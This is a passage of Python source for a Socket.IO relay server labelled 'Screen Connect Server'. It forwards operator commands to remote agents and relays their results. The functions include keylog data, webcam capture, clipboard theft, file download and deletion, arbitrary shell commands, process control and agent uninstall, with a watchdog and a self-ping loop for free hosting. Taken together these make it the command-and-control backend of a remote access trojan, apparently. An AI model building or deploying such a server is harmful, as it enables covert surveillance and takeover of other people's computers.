        ("network_report",         "network_report",        True),
        ("webcam_result",          "webcam_result",         True),
        ("webcam_list_result",     "webcam_list_result",    False),
        ("keylog_data",            "keylog_data",           True),
        ("clipboard_data",         "clipboard_data",        False),
        ("clipboard_result",       "clipboard_result",      True),
        ("clipboard_set_result",   "clipboard_set_result",  False),
        ("action_result",          "action_result",         True),
        ("stream_stats",           "stream_stats",          False),
    ]:
        _relay(_ev_in, _ev_out, also_dashboards=_also_dash)

    @sio.on("agent_alert")
    def on_agent_alert(data):
        did = data.get("device_id", "")
        sio.emit("agent_alert", data, room=f"view:{did}")
        sio.emit("agent_alert", data, room="dashboards")
        _audit("agent_alert", device_id=did, type=data.get("type"), value=data.get("value"))
        _fire_webhook("agent_alert", data)

    # ── Dashboard → device commands ───────────────────────────────────────────
    @sio.on("dashboard_command")
    def on_cmd(data):
        did = data.get("device_id")
        with _dev_lock:
            dev = _devices.get(did)
        if not dev:
            emit("command_error", {"error": f"Device '{did}' not connected."})
            return
        sio.emit("request_action", data, room=did)

    def _fwd(event_name, tab=None, extra_fn=None):
        """Register a dashboard→agent command forwarder."""
        @sio.on(event_name)
        def _handler(data):
            did = data.get("device_id", "")
            with _dev_lock:
                dev = _devices.get(did)
            if not dev:
                return
            payload = {"tab": tab or event_name, "device_id": did, **data}
            if extra_fn:
                extra_fn(payload, data)
            sio.emit("request_action", payload, room=did)

    @sio.on("start_stream")
    def on_start_stream(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            join_room(f"view:{did}")
            with _view_lock: _viewers[did].add(request.sid)
            with _dash_lock: _dashboard_device[request.sid] = did
            sio.emit("request_action", {
                "tab": "monitor", "action": "start", "device_id": did,
                "fps": data.get("fps", 20), "quality": data.get("quality", 55),
                "scale": data.get("scale", 0.8), "mode": data.get("mode", "video"),
                "monitor": data.get("monitor", 1),
            }, room=did)
        else:
            emit("command_error", {"error": f"Device '{did}' not connected."})

    @sio.on("stop_stream")
    def on_stop_stream(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "monitor", "action": "stop", "device_id": did}, room=did)

    @sio.on("set_quality")
    def on_set_quality(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "monitor", "action": "set_quality",
                                        "quality": data.get("quality", 55), "device_id": did}, room=did)

    @sio.on("set_stream_mode")
    def on_set_mode(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "monitor", "action": "set_mode",
                                        "mode": data.get("mode", "video"), "device_id": did}, room=did)

    @sio.on("request_screenshot")
    def on_screenshot(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "screenshot", "quality": data.get("quality", 60),
                                        "scale": data.get("scale", 0.75), "device_id": did}, room=did)

    @sio.on("ping_agent")
    def on_ping(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "ping", "t": data.get("t", utcnow()), "device_id": did}, room=did)

    @sio.on("disconnect_screen")
    def on_disconnect_screen(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "monitor", "action": "stop", "device_id": did}, room=did)

    # Simple forwarders
    for _ename, _tab in [
        ("start_sysmon",      "system"),
        ("stop_sysmon",       "system"),
        ("request_snapshot",  "system_snapshot"),
        ("request_disks",     "disks"),
        ("request_network",   "network"),
        ("list_processes",    "processes"),
        ("kill_process",      "kill_process"),
        ("start_process",     "start_process"),
        ("file_list",         "file_list"),
        ("file_read",         "file_read"),
        ("file_download",     "file_download"),
        ("file_delete",       "file_delete"),
        ("file_upload",       "file_upload"),
        ("request_drives",    "drives"),
        ("clipboard_get",     "clipboard_get"),
        ("clipboard_set",     "clipboard_set"),
        ("uninstall_agent",   "uninstall"),
        ("webcam_capture",    "webcam"),
        ("webcam_list",       "webcam_list"),
    ]:
        _fwd(_ename, tab=_tab)

    @sio.on("shell_command")
    def on_shell(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "shell", "command": data.get("command", "echo hello"),
                                        "shell_type": data.get("shell_type", "cmd"), "device_id": did}, room=did)

    @sio.on("power_command")
    def on_power(data):
        did     = data.get("device_id", "")
        command = data.get("command", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": command, "device_id": did}, room=did)
            _audit("power_command", device_id=did, command=command)

    # ══════════════════════════════════════════════════════════════════════════
    #  Watchdog  (gevent greenlet — uses _sleep so it doesn't block anything)
    # ══════════════════════════════════════════════════════════════════════════
    def _watchdog_loop():
        """
        Runs every 15s inside a gevent greenlet.
        1. Heartbeat timeout → mark offline
        2. Stream recovery → kickstart 0-FPS devices with active viewers
        3. Viewer idle + max-session enforcement
        4. Rate-bucket cleanup
        """
        while True:
            try:
                _sleep(15)
                now_dt   = datetime.datetime.utcnow()
                now_mono = time.monotonic()

                # ── 1. Heartbeat timeout ──────────────────────────────────
                stale = []
                with _dev_lock:
                    for did, dev in list(_devices.items()):
                        lb = dev.get("last_beat")
                        if not lb:
                            continue
                        try:
                            last_dt = datetime.datetime.fromisoformat(lb.replace("Z", ""))
                            if (now_dt - last_dt).total_seconds() > HEARTBEAT_TIMEOUT:
                                stale.append((did, dev.get("label", did), dev.get("sid", "")))
                        except Exception:
                            pass
                    for did, *_ in stale:
                        _devices.pop(did, None)

                for did, label, agent_sid in stale:
                    log.warning(f"Watchdog: heartbeat timeout — {label} ({did})")
                    _notify_reconnecting(did)
                    with _adv_gop_lock:
                        _adv_gop_buf.pop(did, None)
                    _adv_cursor_latest.pop(did, None)
                    _adv_agent_sids.pop(did, None)
                    if agent_sid:
                        with _sid_lock:
                            _sid_to_device.pop(agent_sid, None)
                        _adv_sid_to_agent.pop(agent_sid, None)
                    sio.emit("agent_offline",  {"device_id": did, "label": label, "ts": utcnow()})
                    sio.emit("device_offline", {"device_id": did, "label": label, "ts": utcnow()})
                    _audit("watchdog_offline", device_id=did, label=label)
                    _bg(db_update, did, {"status": "offline", "disconnected_at": utcnow()})
                    _fire_webhook("watchdog_offline", {"device_id": did, "label": label})
                if stale:
                    _bg(broadcast_device_update)

                # ── 2. Stream recovery (kickstart 0-FPS streams) ──────────
                with _dev_lock:
                    online_devs = list(_devices.keys())

                for did in online_devs:
                    with _view_lock:
                        vcount = len(_viewers.get(did, set()))
                    with _adv_viewer_lock:
                        vcount += sum(1 for v in _adv_viewer_rooms.values() if v == did)
                    if vcount == 0:
                        continue
                    with _dev_lock:
                        dev = _devices.get(did)
                        if not dev:
                            continue
                        last_frame = dev.get("last_frame_ts")
                        frame_count = dev.get("frame_count", 0)

                    stuck = False
                    if frame_count == 0 and last_frame is None:
                        stuck = True
                    elif last_frame:
                        try:
                            lf_dt = datetime.datetime.fromisoformat(last_frame.replace("Z", ""))
                            if (now_dt - lf_dt).total_seconds() > 20:
                                stuck = True
                        except Exception:
                            pass

                    if stuck:
                        log.warning(f"Watchdog: stream stalled for {did} with {vcount} viewer(s) — kickstarting")
                        spay = {"tab": "monitor", "action": "start", "device_id": did,
                                "fps": 20, "quality": 70, "scale": 0.8, "monitor": 1}
                        sio.emit("request_action", spay, room=did)
                        agent_adv = _adv_agent_sids.get(did)
                        if agent_adv:
                            sio.emit("request_action", spay, room=agent_adv)

                # ── 3. Viewer idle / max duration ─────────────────────────
                if VIEWER_IDLE_TIMEOUT > 0 or MAX_SESSION_DURATION > 0:
                    to_kick = []
                    with _viewer_activity_lock:
                        for vsid, start in list(_viewer_session_start.items()):
                            if VIEWER_IDLE_TIMEOUT > 0:
                                idle = now_mono - _viewer_last_activity.get(vsid, start)
                                if idle >= VIEWER_IDLE_TIMEOUT:
                                    to_kick.append((vsid, f"Idle timeout ({int(idle)}s)"))
                                    continue
                            if MAX_SESSION_DURATION > 0:
                                dur = now_mono - start
                                if dur >= MAX_SESSION_DURATION:
                                    to_kick.append((vsid, f"Max session duration ({int(dur)}s)"))
                    for vsid, reason in to_kick:
                        try:
                            sio.emit("kicked", {"reason": reason, "ts": utcnow()}, room=vsid)
                            sio.disconnect(vsid)
                            _cleanup_viewer(vsid)
                            _audit("viewer_kicked_policy", viewer_sid=vsid, reason=reason)
                        except Exception:
                            pass

                # ── 4. Rate-bucket cleanup ────────────────────────────────
                with _rate_lock:
                    stale_ips = [ip for ip, dq in _rate_buckets.items() if not dq]
                    for ip in stale_ips:
                        _rate_buckets.pop(ip, None)

                # ── 5. Periodic health log ────────────────────────────────
                if int(now_mono) % 300 < 15:
                    try:
                        import psutil
                        mem = psutil.Process().memory_info().rss // (1024 * 1024)
                    except Exception:
                        mem = "?"
                    with _adv_viewer_lock:
                        adv_viewers = len(_adv_viewer_rooms)
                    log.info(
                        f"Watchdog health | devices={len(_devices)} viewers={adv_viewers} "
                        f"gop_bufs={len(_adv_gop_buf)} threads={threading.active_count()} mem={mem}MB"
                    )

            except Exception as exc:
                _report_crash("_watchdog_loop", exc)
                _sleep(5)

    sio.start_background_task(_watchdog_loop)

    # ── Self-ping to keep Render free tier alive ──────────────────────────────
    def _self_ping_loop():
        if SELF_PING_INTERVAL <= 0 or not REQUESTS_OK:
            return
        _sleep(90)
        render_url = os.environ.get("RENDER_EXTERNAL_URL", "").rstrip("/")
        ping_url   = f"{render_url}/health" if render_url else f"http://127.0.0.1:{PORT}/health"
        log.info(f"Self-ping: {ping_url} every {SELF_PING_INTERVAL}s")
        while True:
            try:
                _requests.get(ping_url, timeout=15)
            except Exception:
                pass
            _sleep(SELF_PING_INTERVAL)

    sio.start_background_task(_self_ping_loop)

# ══════════════════════════════════════════════════════════════════════════════
#  Startup banner
# ══════════════════════════════════════════════════════════════════════════════
def startup():
    log.info("=" * 72)
    log.info(f"  Screen Connect Server  v{VERSION}  — ENTERPRISE STABLE")
    log.info("=" * 72)
    log.info(f"  Gevent patched:     {_GEVENT_OK}   ← MUST be True for stream stability")
    log.info(f"  Async mode:         gevent          ← Fixed from threading")
    log.info(f"  Port:               {PORT}")
    log.info(f"  Heartbeat TTL:      {HEARTBEAT_TIMEOUT}s")
    log.info(f"  Agent exclusive:    {AGENT_EXCLUSIVE}")
    log.info(f"  Max viewers/device: {MAX_VIEWERS_PER_DEVICE or 'unlimited'}")
    log.info(f"  Viewer idle kick:   {VIEWER_IDLE_TIMEOUT or 'disabled'}s")
    log.info(f"  Max session dur:    {MAX_SESSION_DURATION or 'unlimited'}s")
    log.info(f"  Rate limit:         {_RATE_LIMIT_RPM} req/min per IP")
    log.info(f"  Max frame size:     {MAX_FRAME_BYTES // (1024*1024)}MB")
    log.info(f"  Webhook:            {'→ ' + WEBHOOK_URL[:50] if WEBHOOK_URL else 'disabled'}")
    log.info(f"  Stream relay:       per-device isolated rooms")
    log.info(f"  Session handoff:    auto-resume on agent reconnect")
    log.info(f"  Stream recovery:    watchdog kickstart on 0 FPS")
    log.info(f"  GOP buffer:         128 frames per device")
    log.info("=" * 72)
    log.info("  RENDER start command (REQUIRED):")
    log.info("    gunicorn -k geventwebsocket.gunicorn.workers.GeventWebSocketWorker \\")
    log.info("             -w 1 --timeout 300 --keep-alive 75 --bind 0.0.0.0:$PORT server:app")
    log.info("=" * 72)
    if not _GEVENT_OK:
        log.critical("GEVENT NOT INSTALLED — server will crash under load!")
        log.critical("Fix: pip install gevent gevent-websocket")

# ══════════════════════════════════════════════════════════════════════════════
#  Entry point
# ══════════════════════════════════════════════════════════════════════════════
if __name__ == "__main__":
    startup()
    if SOCKETIO_OK and sio:
        sio.run(app, host="0.0.0.0", port=PORT, debug=False, allow_unsafe_werkzeug=True)
    else:
        app.run(host="0.0.0.0", port=PORT, debug=False)
